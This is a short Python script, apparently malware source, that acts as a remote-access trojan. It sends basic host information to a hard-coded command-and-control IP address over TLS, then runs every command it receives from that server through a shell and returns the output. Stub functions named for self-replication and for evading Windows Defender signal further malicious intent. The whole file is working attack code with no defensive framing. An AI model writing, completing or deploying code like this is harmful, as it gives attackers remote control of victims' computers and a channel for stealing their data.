import os
import socket
import platform
import subprocess
import ssl
import json
import urllib.request

C2_SERVER = "89.238.155.150"
C2_PORT = 12345

def replicate():
    # Simplificamos esta función para que no intente explotar routers
    print("Replicación desactivada para esta prueba.")

def evade_defender():
    pass

def collect_info():
    info = {
        "OS": platform.system(),
        "Architecture": platform.machine(),
        "Processors": os.cpu_count(),
        "IP Address": socket.gethostbyname(socket.gethostname())
    }
    return info

def main():
    evade_defender()
    replicate()

    context = ssl.create_default_context()
    with socket.create_connection((C2_SERVER, C2_PORT)) as sock:
        with context.wrap_socket(sock, server_hostname=C2_SERVER) as ssock:
            info = collect_info()
            ssock.sendall(json.dumps(info).encode('utf-8'))

            while True:
                data = ssock.recv(1024)
                if not data:
                    break
                command = data.decode('utf-8')
                print(f"Received command: {command}")
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                ssock.sendall(result.stdout.encode('utf-8'))

if __name__ == "__main__":
    main()
